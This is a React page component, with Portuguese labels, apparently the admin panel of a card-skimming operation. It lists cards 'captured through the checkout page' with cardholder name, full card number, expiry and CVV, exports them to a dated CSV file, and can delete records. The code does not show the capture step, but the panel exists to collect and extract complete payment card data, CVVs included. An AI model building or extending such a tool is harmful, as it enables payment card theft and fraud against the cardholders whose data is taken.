
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { CardCaptureFilter } from "@/components/cardcapture/CardCaptureFilter";
import { CardCaptureTable } from "@/components/cardcapture/CardCaptureTable";
import { useCardCapture } from "@/hooks/useCardCapture";
import { formatDate } from "@/lib/format";
import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Download, RefreshCw, AlertTriangle, Trash2 } from "lucide-react";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { toast } from "sonner";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

const CardCapture = () => {
  const { 
    filteredCards, 
    searchTerm, 
    setSearchTerm, 
    isLoading, 
    error, 
    refreshCards, 
    capturedCards,
    deleteCard,
    deleteAllCards,
    deleteLoading
  } = useCardCapture();
  const [exportLoading, setExportLoading] = useState(false);

  // Add debugging information
  useEffect(() => {
    console.log("CardCapture page - Current filtered cards:", filteredCards);
    console.log("CardCapture page - Loading state:", isLoading);
    console.log("CardCapture page - Error state:", error);
  }, [filteredCards, isLoading, error]);

  const handleExportCSV = () => {
    if (!capturedCards.length) {
      toast.error("Não há dados para exportar");
      return;
    }

    try {
      setExportLoading(true);
      
      // Create CSV header
      const headers = ["Nome", "Número do Cartão", "Validade", "CVV", "Bandeira", "Data de Captura"];
      
      // Create CSV rows
      const rows = capturedCards.map(card => [
        card.nome_cliente,
        card.numero_cartao,
        card.validade,
        card.cvv,
        card.bandeira,
        formatDate(card.criado_em)
      ]);
      
      // Combine header and rows
      const csvContent = [
        headers.join(","),
        ...rows.map(row => row.join(","))
      ].join("\n");
      
      // Create a blob and download
      const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
      const link = document.createElement("a");
      const url = URL.createObjectURL(blob);
      
      link.setAttribute("href", url);
      link.setAttribute("download", `cartoes-capturados-${new Date().toISOString().split('T')[0]}.csv`);
      link.style.visibility = "hidden";
      
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      toast.success("Exportação concluída com sucesso");
    } catch (error) {
      console.error("Error exporting data:", error);
      toast.error("Erro ao exportar dados");
    } finally {
      setExportLoading(false);
    }
  };

  return (
    <div className="space-y-6 animate-fade-in">
      <div className="flex justify-between items-center">
        <h1 className="text-3xl font-bold tracking-tight">Cartões Capturados</h1>
        <div className="flex gap-2">
          <Button 
            variant="outline" 
            size="sm" 
            className="gap-2"
            onClick={refreshCards}
            disabled={isLoading}
          >
            <RefreshCw size={16} className={isLoading ? "animate-spin" : ""} />
            Atualizar
          </Button>
          <Button 
            variant="outline" 
            size="sm" 
            className="gap-2"
            onClick={handleExportCSV}
            disabled={isLoading || exportLoading || capturedCards.length === 0}
          >
            <Download size={16} className={exportLoading ? "animate-pulse" : ""} />
            Exportar CSV
          </Button>
          
          <AlertDialog>
            <AlertDialogTrigger asChild>
              <Button 
                variant="destructive" 
                size="sm" 
                className="gap-2"
                disabled={isLoading || deleteLoading || capturedCards.length === 0}
              >
                <Trash2 size={16} />
                Apagar Todos
              </Button>
            </AlertDialogTrigger>
            <AlertDialogContent>
              <AlertDialogHeader>
                <AlertDialogTitle>Apagar Todos os Cartões</AlertDialogTitle>
                <AlertDialogDescription>
                  Tem certeza que deseja apagar todos os cartões? Esta ação não pode ser desfeita.
                </AlertDialogDescription>
              </AlertDialogHeader>
              <AlertDialogFooter>
                <AlertDialogCancel>Cancelar</AlertDialogCancel>
                <AlertDialogAction 
                  onClick={deleteAllCards}
                  className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
                >
                  Apagar Todos
                </AlertDialogAction>
              </AlertDialogFooter>
            </AlertDialogContent>
          </AlertDialog>
        </div>
      </div>

      <CardCaptureFilter 
        searchTerm={searchTerm}
        setSearchTerm={setSearchTerm}
      />

      {error && (
        <Alert variant="destructive">
          <AlertTriangle className="h-4 w-4" />
          <AlertDescription>
            Erro ao carregar dados: {error}
          </AlertDescription>
        </Alert>
      )}

      <Card>
        <CardHeader>
          <CardTitle>Cartões Capturados</CardTitle>
          <CardDescription>
            Lista de cartões capturados através da página de checkout
            {capturedCards.length > 0 && (
              <span className="ml-2 text-sm text-muted-foreground">
                ({capturedCards.length} {capturedCards.length === 1 ? 'registro' : 'registros'})
              </span>
            )}
          </CardDescription>
        </CardHeader>
        <CardContent>
          <CardCaptureTable 
            cards={filteredCards} 
            formatDate={formatDate} 
            isLoading={isLoading}
            onDeleteCard={deleteCard}
          />
        </CardContent>
      </Card>
    </div>
  );
};

export default CardCapture;
